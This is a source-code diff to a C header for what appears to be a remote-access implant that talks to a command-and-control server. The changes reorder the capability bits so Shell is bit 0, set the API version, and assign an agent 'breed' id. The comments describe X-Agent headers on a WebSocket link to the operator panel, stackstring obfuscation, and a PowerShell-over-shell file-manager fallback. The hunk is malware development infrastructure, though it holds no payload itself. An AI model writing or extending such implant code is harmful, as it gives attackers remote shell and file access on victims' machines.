@@ -80,15 +80,31 @@
 #endif
 
 /* ==========================================================================
- * Capability mask: 8 bytes, one bit per feature category, LSB first:
- *   bit 0 = FileSystem (ListDirectory/ReadFile/HashFile)
- *   bit 1 = Shell      (Open/Write/Read/CloseShell)  <- implemented here
+ * Capability mask: 8 bytes, one bit per FEATURE CATEGORY, LSB first
+ * (C2 docs/05-relay-protocol.md §5 "Capability mask"; the bit index is NOT
+ * the opcode):
+ *   bit 0 = Shell      (Open/Write/Read/CloseShell)  <- implemented here
+ *   bit 1 = FileSystem (ListDirectory/ReadFile/HashFile)
  *   bit 2 = Display    (GetDisplays/GetScreenshot)
- * The mask gates the panel's UI, not the wire: it may still send any
- * command, so unimplemented opcodes are answered honestly with status 1.
+ * The mask travels as the X-Agent-Capabilities header (16 lowercase hex,
+ * byte 0 first - stackstrings.h StrHdrCaps) and gates the panel's UI, not
+ * the wire: the panel may still send any command, so unimplemented opcodes
+ * are answered honestly with status 1. A Shell-only mask also routes the
+ * panel's File Manager to its PowerShell-over-shell fallback (FsBackend).
  * ======================================================================== */
 
-#define CAPABILITY_MASK         2
+#define CAPABILITY_MASK         1      /* bit 0 = Shell */
+
+/* API 1 (C2 docs/13-agent-implementation.md §4): identity = X-Agent-*
+ * HTTP headers on the WebSocket upgrade. The C2 registers only
+ * Api-Version 1 agents (RelaySocket.SupportedApiVersion); agents built
+ * against the old binary Hello frame (API "v5") are invisible to it. */
+#define AGENT_API_VERSION       1
+
+/* Breed id in X-Agent-Name-Id (C2 AgentBreeds: 0=PIA, 1=JScript, 2=C#,
+ * 3=PowerShell). This agent is its own codebase - an unregistered id,
+ * which the panel displays as "Unknown (4)". */
+#define AGENT_NAME_ID           4
 
 /* ==========================================================================
  * Shell category specifics (v4 framing)
